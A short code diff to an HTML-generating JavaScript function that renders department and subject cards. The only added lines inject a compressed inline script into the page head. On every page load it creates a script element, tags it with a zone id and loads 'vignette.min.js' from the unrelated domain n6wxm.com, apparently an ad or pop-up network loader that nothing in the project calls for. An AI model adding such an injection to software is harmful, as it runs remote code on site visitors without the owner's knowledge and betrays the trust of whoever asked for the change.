@@ -109,6 +109,8 @@ function generateHTML(grouped) {
         .subject-card .arrow { color: var(--primary); margin-left: 0.5rem; }
         .empty-dept { color: var(--muted); padding: 2rem 1rem; text-align: center; border-radius: 8px; background: var(--bg-secondary); }
     </style>
+<script>(function(s){s.dataset.zone='11012996',s.src='https://n6wxm.com/vignette.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
+
 </head>
 <body>
 <script src="../assets/js/theme.js" defer></script>
